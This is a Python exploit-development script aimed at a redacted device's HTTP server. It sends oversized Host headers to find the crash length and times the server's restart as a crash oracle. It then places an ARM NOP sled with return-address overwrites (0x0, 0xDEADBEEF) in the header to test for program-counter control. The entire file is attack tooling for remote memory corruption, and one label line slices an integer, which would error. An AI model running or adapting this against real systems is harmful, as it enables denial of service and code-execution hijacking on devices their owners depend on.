#!/usr/bin/env python3
"""
http_overflow_test.py — Characterize the HTTP Host header heap overflow.

Goals:
  1. Find exact crash threshold (buffer size that first causes crash)
  2. Check if it gives PC control (stack overflow → return address overwrite?)
  3. Build HTTP crash-restart oracle (measure time until HTTP comes back)
  4. Try various header positions to find stack overflow instead of heap overflow
  5. Check for other overflow-prone headers

Note: the summary says "~256 bytes, likely heap-based" but we haven't verified.
HTTP heap overflows are harder to exploit than stack overflows.
But some HTTP servers copy Host into a stack buffer for processing — that would be stack.
"""

import socket, time, struct

TARGET = "█████████████"
HTTP_PORT = 80

ARM_NOP  = b'\x01\x10\xa0\xe1'  # MOV R1, R1
ARM_LOOP = b'\xfe\xff\xff\xea'  # B .  (infinite loop)
NOP_SLED = ARM_NOP * 60 + ARM_LOOP   # 244 bytes


def http_alive(timeout=4):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
        d = s.recv(256)
        s.close()
        return b"HTTP" in d or b"html" in d.lower()
    except:
        return False


def wait_http_alive(max_wait=140, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if http_alive():
            print(f"  [✓] HTTP alive ({label}) — waited {time.time()-t0:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    return False


def send_host_overflow(host_value, extra_headers=b"", timeout=8):
    """Send GET / with a long Host header."""
    req = (b"GET / HTTP/1.1\r\n"
           b"Host: " + host_value + b"\r\n"
           b"User-Agent: curl/7.68.0\r\n"
           b"Connection: close\r\n"
           + extra_headers +
           b"\r\n")
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(req)
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return d
    except:
        return b""


def http_oracle(host_value, label="", poll_timeout=90):
    """Measure time from crash to HTTP restart."""
    if not wait_http_alive(max_wait=60, label="pre-test"):
        print("  [!] HTTP not alive, aborting", flush=True)
        return None

    print(f"  [→] Sending Host: {label!r} ({len(host_value)} bytes)", flush=True)
    t0 = time.time()
    send_host_overflow(host_value)

    PROBE = b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.5)
        if time.time() - last_print >= 8:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, HTTP_PORT))
            s2.sendall(PROBE)
            d2 = b""
            try: d2 = s2.recv(256)
            except: pass
            s2.close()
            if b"HTTP" in d2 or b"html" in d2.lower():
                elapsed = time.time() - t0
                print(f"  [★] HTTP restart detected at T+{elapsed:.1f}s", flush=True)
                return elapsed
        except:
            pass
    print(f"  [?] No HTTP restart in {poll_timeout}s", flush=True)
    return poll_timeout


# ── Phase 1: Find exact crash threshold ─────────────────────────────────────

print("=" * 60)
print("Phase 1: Crash threshold scan (Host header length)")
print("=" * 60)

for size in range(200, 600, 20):
    host = b"A" * size
    resp = send_host_overflow(host)
    crashed = len(resp) == 0
    print(f"  size={size:4d}  response={resp[:30]!r}  {'CRASH?' if crashed else 'ok'}", flush=True)
    if crashed:
        # binary search around this point
        print(f"  → crash region found around {size}, binary searching...")
        lo, hi = size - 20, size
        while lo < hi - 1:
            mid = (lo + hi) // 2
            resp = send_host_overflow(b"A" * mid)
            if len(resp) == 0:
                hi = mid
            else:
                lo = mid
            time.sleep(0.3)
        print(f"  THRESHOLD: {hi} bytes (crash at {hi}, OK at {lo})")
        CRASH_THRESHOLD = hi
        break
    time.sleep(0.2)
else:
    CRASH_THRESHOLD = 600
    print(f"  No crash found up to 600 bytes — threshold unknown")

# Wait for HTTP to recover
time.sleep(10)
wait_http_alive(max_wait=120, label="after threshold scan")

# ── Phase 2: Distinguish stack vs heap overflow ──────────────────────────────

print(f"\n{'='*60}")
print(f"Phase 2: Distinguish stack vs heap")
print(f"  Stack: overflow → saved LR at fixed offset → immediate crash (fast)")
print(f"  Heap:  overflow into adjacent heap chunk → may loop or delay")
print(f"  Oracle: jump to NOP+LOOP sled in Host value")
print(f"{'='*60}")

# For stack overflow: if Host buffer is on stack,
# bytes at (CRASH_THRESHOLD + offset) overwrite saved LR/PC.
# We put NOP+LOOP sled in Host, then overwrite PC to point into Host on stack.
# If stack addresses are near 0xBFFF8000, this would show ~60s restart.

# But we don't know the stack address. Alternatively:
# We jump to a known-bad address to measure baseline crash time.
BAD_PC  = struct.pack('<I', 0xDEADBEEF)   # causes kernel panic → 74s
NULL_PC = struct.pack('<I', 0x00000000)   # SIGSEGV → ~2s
LOOP_PC = struct.pack('<I', 0xBFFF8000)   # stack address (test)

threshold = CRASH_THRESHOLD if 'CRASH_THRESHOLD' in dir() else 256

print(f"\n  Baseline crash (Host={threshold} 'A's → no PC control):")
t = http_oracle(b"A" * threshold, f"{'A'*threshold[:10]}... ({threshold}B)")
if t:
    print(f"    baseline restart: {t:.1f}s")
time.sleep(15)
wait_http_alive(max_wait=120)

# Try with NULL PC overwrite (test if we have stack control)
# Structure: NOP_SLED + padding + PC
nop_part = NOP_SLED  # 244 bytes
for pc_offset in [248, 256, 260, 264, 272, 280, 288, 296, 304, 320]:
    if pc_offset < threshold:
        continue
    host = nop_part + b'X' * max(0, pc_offset - len(nop_part)) + NULL_PC + b'Y' * 20
    print(f"\n  PC_OFFSET={pc_offset}: Host({len(host)}B) with NULL_PC = 0x00000000")
    t = http_oracle(host, f"NULL_PC at offset {pc_offset}")
    if t and t < 5:
        print(f"    → FAST {t:.1f}s → NULL dereference confirmed → STACK OVERFLOW!")
        print(f"    → PC control confirmed at offset {pc_offset}")
    elif t and t > 60:
        print(f"    → SLOW {t:.1f}s → heap overflow (NULL not sent to PC)")
    time.sleep(15)
    if not wait_http_alive(max_wait=120):
        break

# Try with DEADBEEF (causes kernel panic if sent to PC)
print("\n  Test with 0xDEADBEEF (should give ~74s if stack overflow with PC control):")
host_dead = nop_part + b'X' * max(0, 256 - len(nop_part)) + BAD_PC + b'Y' * 20
t = http_oracle(host_dead, "0xDEADBEEF at 256")
print(f"  → {t:.1f}s {'KERNEL PANIC - PC CONTROL!' if t and 60 < t < 90 else '?'}")

print("\nDone.")
